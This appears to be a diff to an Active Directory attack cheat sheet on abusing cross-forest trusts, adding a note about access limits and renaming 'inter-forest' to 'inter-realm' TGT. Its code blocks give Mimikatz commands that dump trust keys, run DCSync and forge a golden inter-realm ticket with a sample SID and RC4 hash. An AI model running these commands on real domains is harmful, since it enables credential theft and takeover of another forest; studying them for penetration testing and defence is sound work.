@@ -15,7 +15,9 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
 ```
 
-An **inter-forest TGT** can be forged:
+> **Note**: The access we will have will be limited to what our DA account is configured to have on the other Forest!
+
+An **inter-realm TGT** can be forged:
 
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /rc4:cd3fb1b0b49c7a56d285fffdd1399231 /service:krbtgt /target:extcorp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
